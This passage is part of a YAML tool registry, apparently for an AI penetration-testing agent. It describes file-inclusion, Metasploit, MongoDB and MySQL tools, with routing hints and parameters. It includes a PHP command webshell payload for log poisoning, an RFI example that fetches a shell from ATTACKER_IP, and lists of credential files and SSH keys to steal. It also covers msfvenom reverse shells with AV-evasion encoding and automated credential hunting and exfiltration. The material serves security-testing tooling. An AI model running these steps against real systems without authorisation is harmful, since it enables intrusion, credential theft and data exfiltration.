      - test for Remote File Inclusion vulnerability
      - achieve RCE via LFI combined with log poisoning
      - directory traversal testing with multiple encodings
      never_use_for:
      - SQL injection
      - directory enumeration
      - port scanning
      triggers:
      - file inclusion
      - path traversal
      - LFI
      - RFI
      - php filter
      - log poison
      - ../
      prefer_over: []
    methods:
      test_lfi:
        description: Test a URL parameter for Local File Inclusion by trying path traversal sequences (../) at multiple depths
          with multiple encodings (plain, URL-encoded, double-URL-encoded, null byte, etc.). Tries to read /etc/passwd (Linux)
          or C:\Windows\win.ini (Windows) as proof of concept. Uses {PAYLOAD} placeholder in the URL.
        when_to_use: 'When a web page has a file/page/template parameter that might be vulnerable to path traversal. Examples:
          url=''http://target/page.php?file={PAYLOAD}'', url=''http://target/index.php?page={PAYLOAD}''. The tool automatically
          tries traversal depths 1-8 with various encodings. Set os=''linux'' or ''windows'' to target specific paths. Use
          success_pattern for custom detection when the default /etc/passwd check doesn''t work.'
        params:
          url:
            type: string
            required: true
            description: Target URL with {PAYLOAD} placeholder
          os:
            type: enum
            values:
            - linux
            - windows
            - auto
            default: auto
            description: Target operating system
          depth:
            type: integer
            default: 8
            description: Maximum directory traversal depth
          encodings:
            type: array
            description: Encodings to try (plain, url, double-url, etc.)
          cookie:
            type: string
            description: Cookie header for authenticated testing
          headers:
            type: object
            description: Custom HTTP headers
          success_pattern:
            type: string
            description: Regex pattern indicating successful inclusion
          timeout:
            type: integer
            default: 10
            description: Request timeout per attempt
        returns:
          vulnerable:
            type: boolean
            description: Whether LFI was found
          vulnerabilities:
            type: array
            description: Working payloads and encodings
          working_payload:
            type: string
            description: First successful payload
      test_rfi:
        description: 'Test a URL parameter for Remote File Inclusion by trying 6 default PHP wrappers: direct URL, http://,
          https://, ftp://, data://text/plain;base64 (encodes a PHP include statement), and expect://. Replaces {PAYLOAD}
          in the URL with each wrapper+remote_url combination. Checks for HTTP 200 with non-empty body as success indicator.
          IMPORTANT: verify results by checking if your controlled server received an inbound request — a 200 response alone
          does not confirm RFI.'
        when_to_use: 'When a URL parameter might allow remote URL inclusion (typically PHP applications with allow_url_include=On).
          Requires a controlled remote server — use netcat http_listen or a VPS to serve a test file. Workflow: (1) start
          netcat http_listen on attacker, (2) test_rfi with remote_url pointing to your listener, (3) check http_requests
          on the listener to verify the target fetched your URL. If allow_url_include is off, try php_filter or LFI-to-RCE
          via log_poison instead.'
        params:
          url:
            type: string
            required: true
            description: Target URL with {PAYLOAD} placeholder where the file/page parameter is (e.g., 'http://target/page.php?file={PAYLOAD}').
          remote_url:
            type: string
            required: true
            description: URL on your controlled server to include (e.g., 'http://ATTACKER_IP:8080/shell.txt'). The file should
              contain PHP code if testing PHP RFI.
          wrappers:
            type: array
            description: 'PHP wrappers to try. Default: ['''', ''http://'', ''https://'', ''ftp://'', ''data://text/plain;base64,'',
              ''expect://'']. Override to test specific wrappers only.'
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 10
            description: Request timeout per wrapper attempt in seconds.
        returns:
          vulnerable:
            type: boolean
            description: Whether any wrapper returned HTTP 200 with content (verify with remote server logs).
          vulnerabilities:
            type: array
            description: Wrappers that produced a 200 response with body length — each entry has wrapper, payload, url, status_code,
              body_length.
      read_file:
        description: Read a specific file through a confirmed LFI vulnerability using the known-working traversal string and
          depth. Builds payload as (traversal * depth) + file_path, or wrapper + file_path if a PHP wrapper is specified.
          Returns the full response body (up to 100KB). Use this after test_lfi confirms the vulnerability — copy the working
          traversal and depth from those results.
        when_to_use: 'After test_lfi confirms LFI, to extract specific files. Use the working traversal/depth from test_lfi
          results. High-value files to read: /etc/shadow (password hashes), /home/*/.ssh/id_rsa (SSH keys), /var/www/html/wp-config.php
          (database creds), .env files, /proc/self/environ (environment variables with secrets), /etc/apache2/sites-enabled/*
          (vhost configs revealing internal paths). For PHP source code, use php_filter instead — read_file would execute
          the PHP rather than show source.'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi).
          file_path:
            type: string
            required: true
            description: Absolute path of file to read (e.g., '/etc/shadow', '/home/user/.ssh/id_rsa', '/var/www/html/.env').
              Leading slash is stripped when building traversal payload.
          traversal:
            type: string
            default: ../
            description: Traversal string that worked in test_lfi (e.g., '../', '%2e%2e%2f', '..%2f'). Must match what test_lfi
              found.
          depth:
            type: integer
            default: 8
            description: Traversal depth (number of times to repeat the traversal string). Use the depth from test_lfi results.
          wrapper:
            type: string
            description: PHP wrapper to prepend instead of traversal (e.g., 'php://filter/convert.base64-encode/resource=').
              When set, traversal and depth are ignored.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds. Increase for large files.
        returns:
          content:
            type: string
            description: File contents (up to 100KB). Full response body — may include surrounding HTML from the vulnerable
              page.
          content_length:
            type: integer
            description: Length of the file content in the response.
      php_filter:
        description: 'Read a file via php://filter/convert.base64-encode/resource= wrapper, which base64-encodes the file
          content before inclusion — preventing PHP execution and returning raw source code. The tool auto-extracts base64
          strings from the response (regex: 20+ base64 chars) and decodes them. Does NOT require path traversal — PHP filter
          wrapper uses absolute paths directly. Returns both raw base64 and decoded content (up to 50KB).'
        when_to_use: 'To read PHP source code without it being executed by the server. Critical for: (1) reading PHP config
          files to find database credentials (wp-config.php, config.php, .env), (2) reading PHP application source to find
          hardcoded secrets or logic flaws, (3) reading any file when standard LFI fails due to PHP execution. Does NOT need
          traversal — use file_path=''config.php'' for relative or ''/var/www/html/config.php'' for absolute. Works on any
          PHP application with LFI where php:// wrappers are enabled (allow_url_include not required for filter wrapper).'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (e.g., 'http://target/page.php?file={PAYLOAD}').
          file_path:
            type: string
            required: true
            description: File to read. Can be relative (e.g., 'config.php', '../wp-config.php') or absolute (e.g., '/var/www/html/index.php').
              The tool prepends 'php://filter/convert.base64-encode/resource=' automatically.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds.
        returns:
          decoded_content:
            type: string
            description: Base64-decoded file content (up to 50KB). This is the actual source code.
          base64_content:
            type: string
            description: Raw base64 string extracted from the response. Useful for manual verification.
      log_poison:
        description: 'Achieve RCE via LFI + log poisoning in two steps: (1) inject PHP code into a server log file by sending
          a request with the payload in a chosen HTTP header (User-Agent, Referer, or X-Forwarded-For), (2) include the poisoned
          log file via the confirmed LFI vulnerability to trigger PHP execution. The injection request goes to the server''s
          root URL. Then the log file is included via traversal. Checks if the payload text or ''<?php'' appears in the response
          to verify success.'
        when_to_use: 'To escalate LFI to Remote Code Execution when RFI (allow_url_include) is disabled. Requires: (1) confirmed
          LFI vulnerability (run test_lfi first), (2) knowledge of the log file path. Common log paths: Apache=/var/log/apache2/access.log,
          Nginx=/var/log/nginx/access.log, mail=/var/log/mail.log, SSH=/var/log/auth.log. Typical payload: ''<?php system($_GET["cmd"]);
          ?>'' — after poisoning, append &cmd=id to the URL to execute commands. Use User-Agent header by default (most reliably
          logged). If poisoning succeeds, subsequent requests to the LFI URL with the log file will execute your PHP code.'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi). After poisoning, the log file
              is included via this URL.
          log_file:
            type: string
            required: true
            description: Path to the log file to poison (e.g., '/var/log/apache2/access.log', '/var/log/nginx/access.log',
              '/var/log/mail.log'). Try read_file first to confirm the log file is readable via LFI.
          payload:
            type: string
            required: true
            description: PHP code to inject into the log (e.g., '<?php system($_GET["cmd"]); ?>' for command execution, '<?php
              phpinfo(); ?>' for testing). Keep payloads short — logs may truncate long values.
          traversal:
            type: string
            default: ../
            description: Traversal string that works (from test_lfi results).
          depth:
            type: integer
            default: 8
            description: Traversal depth (from test_lfi results).
          poison_header:
            type: enum
            values:
            - User-Agent
            - Referer
            - X-Forwarded-For
            default: User-Agent
            description: HTTP header to inject the payload into. User-Agent is most commonly logged by Apache/Nginx. Try Referer
              or X-Forwarded-For if User-Agent is sanitized.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds for each of the two requests (poison + include).
        returns:
          payload_visible:
            type: boolean
            description: Whether the injected payload text appears in the log file response. True means the log was successfully
              poisoned and PHP code is present.
          body_preview:
            type: string
            description: First 2KB of the response after including the poisoned log file. Check for PHP execution output.
  metasploit:
    name: metasploit
    version: '6.4'
    description: 'Metasploit Framework v6.4 with persistent sessions via msfrpcd (RPC daemon). 9 methods: generate_payload
      (msfvenom for executables and shellcode), search_modules (find exploits/auxiliary/post modules), check_vuln (scanner
      module verification), run_exploit (execute exploit with session creation), exec_command (one-shot command execution
      via exploit), list_sessions (active meterpreter/shell sessions), session_command (run commands in sessions), post_module
      (post-exploitation modules), handler (multi/handler for reverse shells). Sessions persist across tool calls. Runs as
      a service container — msfrpcd stays running between calls.'
    image: ghcr.io/silicon-works/mcp-tools-metasploit:latest
    image_size_mb: 3000
    service: true
    service_name: metasploit
    capabilities:
    - payload_generation
    - exploit_execution
    - vulnerability_checking
    - module_search
    - session_management
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 2048
      cpu: 1.0
    routing:
      use_for:
      - run Metasploit exploit module against a target
      - generate msfvenom payloads for reverse shells or meterpreter
      - check if target is vulnerable with Metasploit scanner module
      - manage meterpreter or shell sessions on exploited targets
      - run post-exploitation modules for credential gathering
      - set up multi/handler to catch reverse shell connections
      - search for Metasploit modules by CVE or service name
      - execute commands through exploit without full session
      never_use_for:
      - port scanning
      - directory enumeration
      - SQL injection
      triggers:
      - metasploit
      - msfvenom
      - meterpreter
      - exploit module
      - msf
      prefer_over: []
    methods:
      generate_payload:
        description: Generate a payload using msfvenom. Supports all Metasploit payloads (staged/stageless, meterpreter/shell)
          in multiple output formats (exe, elf, raw, python, php, asp, c, dll). Optional encoding with x86/shikata_ga_nai
          or other encoders for AV evasion. Returns the payload as base64.
        when_to_use: 'When you need a compiled payload binary for delivery to a target. Common payloads: ''windows/meterpreter/reverse_tcp''
          (staged Windows meterpreter), ''linux/x64/shell_reverse_tcp'' (stageless Linux reverse shell), ''php/meterpreter/reverse_tcp''
          (PHP web shell). After generating, use handler to start a listener, then deliver the payload to the target. For
          simple text-based reverse shells (bash, python one-liners), use payload tool''s revshell or exploit-runner''s generate_payload
          instead.'
        params:
          payload:
            type: string
            required: true
            description: Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut
          lhost:
            type: string
            required: true
            description: Listening host IP for reverse connections
          lport:
            type: integer
            required: true
            description: Listening port for reverse connections
          format:
            type: string
            default: raw
            description: 'Output format: exe, elf, raw, python, php, asp, c, dll, etc.'
          encoder:
            type: string
            description: Encoder to use (e.g., 'x86/shikata_ga_nai')
          iterations:
            type: integer
            default: 1
            description: Number of encoding iterations
        returns:
          payload_base64:
            type: string
            description: Base64 encoded payload
          size_bytes:
            type: integer
            description: Payload size in bytes
      search_modules:
        description: Search for Metasploit modules
        when_to_use: To find exploits or auxiliary modules for a specific vulnerability or service
        params:
          query:
            type: string
            required: true
            description: Search query (e.g., 'ms17-010', 'apache struts', 'smb')
          type:
            type: enum
            values:
            - all
            - exploit
            - auxiliary
            - post
            - payload
            default: all
            description: Module type to search for
        returns:
          modules:
            type: array
            description: Matching modules with paths and descriptions
      check_vuln:
        description: Check if a target is vulnerable using an auxiliary scanner module
        when_to_use: To verify if a target is vulnerable before attempting exploitation
        params:
          module:
            type: string
            required: true
            description: Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')
          rhosts:
            type: string
            required: true
            description: Target host(s)
          options:
            type: object
            description: Additional module options as key-value pairs
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          vulnerable:
            type: boolean
            description: Whether target appears vulnerable
      run_exploit:
        description: Run an exploit module against a target. Sets RHOSTS, payload, LHOST, LPORT, and any additional options,
          then executes. Returns whether the exploit succeeded and any new sessions created. Sessions persist across tool
          calls — use list_sessions and session_command to interact with them.
        when_to_use: 'To exploit a confirmed vulnerability with a Metasploit module. Always run check_vuln first when available.
          Common exploit workflow: search_modules(''ms17-010'') → check_vuln with the auxiliary module → run_exploit with
          the exploit module. Provide lhost/lport for reverse payloads. Sessions opened by successful exploits persist in
          msfrpcd and can be accessed later via session_command.'
        params:
          module:
            type: string
            required: true
            description: Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
          rhosts:
            type: string
            required: true
            description: Target host(s)
          payload:
            type: string
            description: Payload to use
          lhost:
            type: string
            description: Listening host for reverse payloads
          lport:
            type: integer
            description: Listening port for reverse payloads
          options:
            type: object
            description: Additional module options
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds
        returns:
          exploit_success:
            type: boolean
            description: Whether exploit appeared successful
          sessions:
            type: array
            description: New sessions opened (id, type, info, via_exploit, tunnel_peer)
          session_count:
            type: integer
            description: Number of new sessions opened
      exec_command:
        description: Execute a command on target using an exploit with cmd/unix/generic payload
        when_to_use: For command execution exploits without needing a full session
        params:
          module:
            type: string
            required: true
            description: Exploit module path that supports command execution
          rhosts:
            type: string
            required: true
            description: Target host(s)
          command:
            type: string
            required: true
            description: Command to execute on the target
          options:
            type: object
            description: Additional module options (e.g., RPORT, TARGETURI)
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          exploit_success:
            type: boolean
            description: Whether exploit succeeded
          command_output:
            type: string
            description: Output from executed command
      list_sessions:
        description: List active Meterpreter/shell sessions
        when_to_use: To check for established sessions from previous exploits
        params:
          timeout:
            type: integer
            default: 30
            description: Timeout in seconds
        returns:
          sessions:
            type: array
            description: Active sessions with id, type, info, tunnel_local, tunnel_peer, via_exploit, via_payload, platform,
              arch
          count:
            type: integer
            description: Number of active sessions
      session_command:
        description: Run a command in an active session
        when_to_use: To execute commands in an established Meterpreter/shell session
        params:
          session_id:
            type: integer
            required: true
            description: Session ID to interact with
          command:
            type: string
            required: true
            description: Command to execute in the session
          timeout:
            type: integer
            default: 60
            description: Timeout in seconds
        returns:
          session_id:
            type: integer
            description: Session ID used
          command:
            type: string
            description: Command executed
          output:
            type: string
            description: Output from the command
      post_module:
        description: Run a post-exploitation module on a session
        when_to_use: For post-exploitation tasks like credential gathering, privilege escalation
        params:
          module:
            type: string
            required: true
            description: Post module path (e.g., 'post/multi/gather/env')
          session_id:
            type: integer
            required: true
            description: Session ID to run the module on
          options:
            type: object
            description: Additional module options
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          module:
            type: string
            description: Module executed
          session_id:
            type: integer
            description: Session ID used
      handler:
        description: Start a multi/handler to catch reverse shells
        when_to_use: To set up a persistent listener for reverse shell payloads
        params:
          payload:
            type: string
            required: true
            description: Payload to listen for (e.g., 'windows_reverse_tcp')
          lhost:
            type: string
            required: true
            description: Listening host IP
          lport:
            type: integer
            required: true
            description: Listening port
          timeout:
            type: integer
            default: 300
            description: Timeout waiting for connection (seconds)
        returns:
          payload:
            type: string
            description: Payload type
          lhost:
            type: string
            description: Listening host
          lport:
            type: integer
            description: Listening port
          handler_started:
            type: boolean
            description: Whether handler started successfully
          job_id:
            type: string
            description: Background job ID in msfrpcd
  mongodb:
    name: mongodb
    version: '1.0'
    description: MongoDB client (pymongo 4.16.0) for remote database enumeration and data extraction over the network. Connects
      to MongoDB servers (default port 27017) with optional username/password authentication against a specified auth database.
      Supports both authenticated and unauthenticated access — many MongoDB instances found during pentesting have no authentication
      enabled. Includes automated credential hunting that pattern-matches collection names (users, accounts, admins, credentials,
      auth, login, passwords) and field names (password, hash, token, api_key, secret) across all databases. Also provides
      server fingerprinting (version, storage engines, modules, JS engine).
    image: ghcr.io/silicon-works/mcp-tools-mongodb:latest
    image_size_mb: 250
    capabilities:
    - database_enumeration
    - nosql_access
    - credential_extraction
    - data_exfiltration
    phases:
    - enumeration
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    routing:
      use_for:
      - MongoDB database enumeration and data extraction
      - connect to unauthenticated MongoDB instance on port 27017
      - extract credentials from MongoDB collections
      - enumerate MongoDB databases and collections
      - NoSQL database access and document retrieval
      - MongoDB server fingerprinting and version detection
      - query MongoDB documents with filter and projection
      - dump MongoDB collection contents
      - search for passwords tokens secrets in MongoDB
      - post-exploitation MongoDB data exfiltration
      - connect to MongoDB using connection string URI
      - MongoDB TLS encrypted connection
      never_use_for:
      - SQL databases (use mysql or sqlite)
      - NoSQL injection (use nosqlmap)
      - port scanning
      triggers:
      - MongoDB
      - NoSQL
      - mongo
      - port 27017
      - BSON
      - document database
    methods:
      connect:
        description: Test connection to a MongoDB server by sending a ping command to the admin database and retrieving server_info().
          Verifies whether the server accepts unauthenticated connections or requires credentials. Returns the MongoDB server
          version and whether authentication was used. Supports TLS connections and direct URI connection strings.
        when_to_use: First step when nmap discovers port 27017 (or another MongoDB port) open. Tests whether the MongoDB instance
          allows unauthenticated access (common misconfiguration) or requires credentials. Try without username/password first
          — if it succeeds, the server has no auth and you can proceed to list_databases. If it fails with 'Authentication
          failed', try known credentials or default credentials. If you found a MongoDB connection string in a config file,
          pass it via the uri param.
        params:
          host:
            type: string
            description: MongoDB hostname or IP (e.g., '10.10.10.1', 'target.htb'). Not required if uri is provided.
          port:
            type: integer
            default: 27017
            description: MongoDB port (default 27017). Nmap may find MongoDB on non-standard ports.
          username:
            type: string
            description: 'Username for authentication. Omit to test unauthenticated access. Common defaults: ''admin'', ''root'',
              ''mongodb''.'
          password:
            type: string
            description: Password for authentication. Omit to test unauthenticated access.
          auth_db:
            type: string
            default: admin
            description: Authentication database — the database that contains the user credentials. Default 'admin'. Some
              apps use their own database for auth (e.g., 'myapp').
          uri:
            type: string
            description: Full MongoDB connection string URI (e.g., 'mongodb://user:pass@host:27017/db?authSource=admin').
              If provided, overrides host/port/username/password/auth_db params. Useful when you find a connection string
              in config files.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection. Required for MongoDB instances configured with TLS/SSL.
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames (for self-signed certs). Only effective when tls=true.
          timeout:
            type: integer
            default: 5
            description: Connection timeout in seconds. Increase to 10-15 for slow/remote connections.
        returns:
          connected:
            type: boolean
            description: Whether the connection and ping succeeded
          version:
            type: string
            description: MongoDB server version (e.g., '7.0.14', '6.0.12', '4.4.29')
          authenticated:
            type: boolean
            description: Whether authentication credentials were provided
      list_databases:
        description: List all databases on the MongoDB server with their sizes. Returns each database's name, size on disk
          (bytes), and whether it's empty. Equivalent to 'show dbs' in the mongo shell.
        when_to_use: After successful connection to enumerate all databases on the server. Look for application databases
          (not admin/config/local system databases) that may contain user data, credentials, or sensitive information. Database
          names often reveal the application (e.g., 'wordpress', 'app_production', 'users_db').
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          databases:
            type: array
            description: List of databases, each with 'name', 'sizeOnDisk' (bytes), and 'empty' (boolean)
          count:
            type: integer
            description: Total number of databases
      list_collections:
        description: List all collection names in a specific database. Equivalent to 'show collections' in the mongo shell.
          Collections are MongoDB's equivalent of SQL tables.
        when_to_use: After list_databases identifies interesting application databases. Collection names reveal the data model
          — look for collections like 'users', 'accounts', 'sessions', 'tokens', 'config', 'secrets' that may contain credentials
          or sensitive data.
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          database:
            type: string
            required: true
            description: Database name (from list_databases output)
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          collections:
            type: array
            description: List of collection name strings
          count:
            type: integer
            description: Number of collections in the database
      query:
        description: Query documents from a MongoDB collection using filter, projection, and sort. Runs collection.find(filter,
          projection).sort(sort).limit(N) via pymongo. ObjectIds are auto-serialized to strings, bytes to hex. Returns documents
          as JSON-serializable dictionaries.
        when_to_use: When you need to retrieve specific documents matching criteria — e.g., find admin users, search for specific
          email addresses, find documents with password fields. Use filter for matching and projection to select only needed
          fields (reduces output size). Use sort to order results (e.g., newest first). For dumping all documents without
          filtering, use dump_collection instead.
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          database:
            type: string
            required: true
            description: Database name
          collection:
            type: string
            required: true
            description: Collection name
          filter:
            type: object
            default: {}
            description: 'MongoDB query filter as JSON object. Examples: {} (all docs), {"role": "admin"} (exact match), {"email":
              {"$regex": "@company.com"}} (regex), {"password": {"$exists": true}} (has field), {"age": {"$gt": 18}} (comparison).
              Supports all MongoDB query operators ($eq, $ne, $gt, $lt, $in, $regex, $exists, $or, $and).'
          projection:
            type: object
            description: 'Fields to include or exclude from results. Use {"field": 1} to include or {"field": 0} to exclude.
              Examples: {"username": 1, "password": 1} (only these fields + _id), {"_id": 0, "largeBlob": 0} (exclude specific
              fields). Cannot mix include and exclude (except _id).'
          sort:
            type: object
            description: 'Sort order as JSON object. Use 1 for ascending, -1 for descending. Examples: {"created_at": -1}
              for newest first, {"username": 1} for alphabetical, {"score": -1, "name": 1} for multi-field sort.'
          limit:
            type: integer
            default: 100
            description: Maximum documents to return. Default 100. Set to 0 for no limit (careful with large collections).
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          documents:
            type: array
            description: Matching documents as dictionaries (ObjectIds serialized to strings, bytes to hex)
          count:
            type: integer
            description: Number of documents returned
      dump_collection:
        description: Dump all documents from a collection (shorthand for query with empty filter). Internally calls query
          with filter={} and the specified limit. Use this for quick full-collection extraction without needing to construct
          a filter.
        when_to_use: After identifying interesting collections via list_collections, use this to extract all documents. Simpler
          than query when you don't need filtering or projection — just dumps everything up to the limit. For credential collections,
          consider using find_credentials instead which auto-detects credential fields across multiple collections.
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          database:
            type: string
            required: true
            description: Database name
          collection:
            type: string
            required: true
            description: Collection name to dump
          limit:
            type: integer
            default: 100
            description: Maximum documents to return. Default 100. Increase for small collections, keep low to sample large
              ones.
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          documents:
            type: array
            description: All documents from the collection (up to limit), serialized as JSON dictionaries
          count:
            type: integer
            description: Number of documents returned
      find_credentials:
        description: 'Automatically search for credential-related data across databases and collections. Two-pass search:
          first scans collections whose names match 14 credential patterns (users, accounts, members, admins, credentials,
          auth, login, passwords, etc.), then scans ALL remaining collections for documents containing credential-like field
          names (password, hash, token, api_key, secret, etc.). This second pass catches credentials stored in non-obviously-named
          collections (e.g., ''staff'', ''people'', ''data''). Returns up to 5 sample documents per matching collection with
          match_type indicating how it was found (''collection_name'' or ''field_pattern'').'
        when_to_use: 'First thing to run after connecting to a MongoDB server to automatically find stored credentials. Searches
          across ALL non-system databases so you don''t need to enumerate databases/collections manually first. The two-pass
          approach means it won''t miss credentials even if they''re in collections with non-obvious names. If this returns
          no results, fall back to manual enumeration: list_databases → list_collections → dump_collection on interesting
          collections.'
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          database:
            type: string
            description: Specific database to search. If omitted, searches ALL non-system databases (admin, config, local
              are excluded). Specify a database to narrow the search.
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          findings:
            type: array
            description: 'Matching collections, each with: ''database'' name, ''collection'' name, ''document_count'' (total
              docs in collection), ''has_credential_fields'' (boolean), ''match_type'' (''collection_name'' if matched by
              name, ''field_pattern'' if matched by field content), ''sample_documents'' (up to 5 sample docs with all fields)'
          databases_searched:
            type: array
            description: List of database names that were searched
          total_findings:
            type: integer
            description: Number of matching collections found
      server_info:
        description: Get detailed MongoDB server information by running server_info() and buildInfo admin commands. Returns
          version, git version, architecture (32/64-bit), loaded modules (e.g., enterprise), available storage engines (e.g.,
          wiredTiger, ephemeralForTest), JavaScript engine, and max BSON object size.
        when_to_use: 'To fingerprint the MongoDB installation after connecting. The version is important for: identifying
          known CVEs (e.g., pre-auth RCE in older versions), determining available features, and reporting. Modules list reveals
          if this is MongoDB Community or Enterprise. Storage engine info helps understand the deployment. Also useful when
          connect already succeeded but you want more details.'
        params:
          host:
            type: string
            description: MongoDB hostname or IP (not required if uri is provided)
          port:
            type: integer
            default: 27017
            description: MongoDB port
          username:
            type: string
            description: Username for authentication (omit for unauthenticated access)
          password:
            type: string
            description: Password for authentication
          auth_db:
            type: string
            default: admin
            description: Authentication database
          uri:
            type: string
            description: Full MongoDB connection string URI. Overrides host/port/username/password/auth_db.
          tls:
            type: boolean
            default: false
            description: Enable TLS for the connection
          tls_insecure:
            type: boolean
            default: false
            description: Allow invalid TLS certificates and hostnames
        returns:
          version:
            type: string
            description: MongoDB server version (e.g., '7.0.14')
          git_version:
            type: string
            description: Git commit hash of the server build
          modules:
            type: array
            description: Loaded modules (empty for Community, ['enterprise'] for Enterprise)
          bits:
            type: integer
            description: 'Architecture: 32 or 64 bit'
          storage_engines:
            type: array
            description: Available storage engines (e.g., ['devnull', 'ephemeralForTest', 'wiredTiger'])
          javascript_engine:
            type: string
            description: JavaScript engine used (e.g., 'mozjs')
          max_bson_object_size:
            type: integer
            description: Maximum BSON document size in bytes (default 16MB)
  mysql:
    name: mysql
    version: '8.0'
    description: 'MySQL/MariaDB client (mysql CLI 8.0) for direct database access, enumeration, and data extraction. 5 methods:
      query (execute arbitrary SQL), list_databases (SHOW DATABASES), list_tables (SHOW TABLES in database), dump_table (SELECT
      with column filtering and row limit), find_credentials (auto-search for user/password columns across tables). Uses the
      mysql CLI with JSON output for structured results. Connects per-query (no persistent sessions).'
    image: ghcr.io/silicon-works/mcp-tools-mysql:latest
    image_size_mb: 300
    capabilities:
    - database_enumeration
    - sql_query_execution
    - credential_extraction
    - data_exfiltration
    phases:
    - enumeration
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    routing:
      use_for:
      - connect to MySQL or MariaDB and run SQL queries
      - enumerate databases and tables on MySQL server
      - extract credentials from MySQL user tables
      - dump table contents from MySQL database
      - find password hashes in MySQL database
      - read files via MySQL LOAD_FILE function
      never_use_for:
      - SQL injection testing (use sqlmap)
      - port scanning
      - MongoDB or SQLite access
      triggers:
      - MySQL
      - MariaDB
      - database query
      - SQL query
      - database enumeration
      - port 3306
      - dump database
    methods:
      query:
        description: Execute an arbitrary SQL query on a MySQL/MariaDB database. Returns results as an array of row objects
          with column names as keys. Supports SELECT, SHOW, DESCRIBE, and data modification queries. Output is JSON-parsed
          for structured results.
        when_to_use: 'For custom SQL queries beyond what the helper methods provide. Common pentest queries: (1) ''SELECT
          user, authentication_string FROM mysql.user'' — dump MySQL user hashes, (2) ''SELECT LOAD_FILE("/etc/passwd")''
          — read files via MySQL (requires FILE privilege), (3) ''SELECT @@version'' — get MySQL version, (4) ''SHOW GRANTS
          FOR CURRENT_USER()'' — check privileges, (5) ''SELECT * FROM information_schema.tables'' — full schema enumeration.
          Use list_databases/list_tables/dump_table for standard enumeration instead.'
        params:
          host:
            type: string
            required: true
            description: MySQL server hostname or IP. Use '127.0.0.1' with tunnel forward for localhost-only databases.
          username:
            type: string
            required: true
            description: MySQL username (e.g., 'root', 'admin', discovered user).
          password:
            type: string
            description: MySQL password.
          database:
            type: string
            description: Database to USE before running the query. Omit for cross-database queries.
          query:
            type: string
            required: true
            description: SQL query to execute. Semicolons handled automatically.
          port:
            type: integer
            default: 3306
            description: MySQL port.
          timeout:
            type: integer
            default: 30
